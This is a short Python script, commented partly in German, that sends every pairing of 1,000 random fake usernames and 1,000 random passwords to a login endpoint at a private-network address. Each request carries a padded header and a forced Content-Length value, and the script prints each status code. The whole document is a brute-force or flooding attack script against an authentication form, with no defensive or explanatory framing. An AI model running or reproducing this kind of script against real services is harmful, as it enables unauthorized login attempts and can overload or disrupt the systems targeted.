import requests
import itertools
from faker import Faker
import itertools

# Die URL des Login-Formulars
url = 'http://192.168.2.150:8000/auth/login'

# Create an instance of Faker
fake = Faker()
amount = 1000

# Generate a list of random usernames and passwords
content_length = 1000
other_parameter = fake.word() * content_length
usernames = [fake.user_name() for _ in range(amount)]
passwords = [fake.password() for _ in range(amount)]

# Generate all combinations of usernames and passwords
credentials = itertools.product(usernames, passwords)

# Set the variable values for content length and other parameters

# Durchlaufe alle Kombinationen und sende sie an den Server
for username, password in credentials:
    headers = {'Content-Length': str(content_length), 'Other-Parameter': other_parameter}
    response = requests.post(url, data={'username': username, 'password': password}, headers=headers)
    print(f'Trying {username}/{password}: Status Code {response.status_code}')
